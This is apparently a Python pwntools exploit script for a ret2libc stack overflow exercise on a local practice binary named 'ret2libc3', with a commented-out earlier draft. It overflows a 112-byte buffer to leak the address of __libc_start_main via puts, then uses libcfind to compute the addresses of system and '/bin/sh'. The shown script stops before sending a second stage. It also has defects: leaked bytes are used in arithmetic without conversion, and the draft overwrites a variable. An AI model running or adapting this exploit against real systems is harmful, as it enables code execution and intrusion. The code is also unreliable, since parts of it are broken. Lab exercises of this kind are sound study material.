
from pwn import *
import libcfind
from Crypto.Util.number import bytes_to_long, long_to_bytes,isPrime
'''
sh = process('./ret2libc3')

start_addr = 0x080484D0
put_plt = 0x08048460
libc_main_addr = 0x0804a018


payload = 112 * b'a' + p32(put_plt) + p32(start_addr) + p32(libc_main_addr)

sh.recv()
sh.sendline(payload)

libc_real_addr = bytes_to_long(sh.recv(4))
x = libcfind.finder('puts',libc_real_addr)
libc_system=x.symbols['system'] 
print(hex(libc_system))
real_str_bin_sh=x.dump('system')
real_str_bin_sh=x.dump('str_bin_sh')
'''

from pwn import *

sh = process('./StackOverflow/ret2libc/ret2libc3')

ret2libc3 = ELF('./StackOverflow/ret2libc/ret2libc3')

puts_plt = ret2libc3.plt['puts']
libc_start_main_got = ret2libc3.got['__libc_start_main']
main = ret2libc3.symbols['main']
sh.recv()
payload = flat(['A' * 112, puts_plt, main, libc_start_main_got])
print(payload)
sh.sendline(payload)

libc_start_main_addr = sh.recv()[0:4]
print(libc_start_main_addr)
libc = libcfind.finder('__libc_start_main', libc_start_main_addr)
libcbase = libc_start_main_addr - libc.dump('__libc_start_main')
system_addr = libcbase + libc.dump('system')
binsh_addr = libcbase + libc.dump('str_bin_sh')

print(system_addr,binsh_addr)